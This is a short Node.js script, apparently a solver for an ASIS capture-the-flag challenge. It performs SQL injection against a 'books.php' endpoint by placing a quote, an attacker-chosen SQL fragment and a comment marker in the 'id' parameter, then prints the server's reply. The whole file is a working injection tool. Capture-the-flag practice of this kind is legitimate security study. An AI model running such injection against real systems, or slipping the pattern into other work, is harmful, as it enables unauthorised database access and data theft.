const axios = require('axios').default;


async function sqli(sql) {
  const url = 'https://poems.asisctf.com/books.php';
  const params = {
    type: 'excerpt',
    id: `'${sql} #`,
  }
  const res = await axios.get(url, {params});
  console.log(res.data);
}


async function solve() {
  if (process.argv.length < 3) {
    return;
  }
  sqli(process.argv[2]);
}


solve();
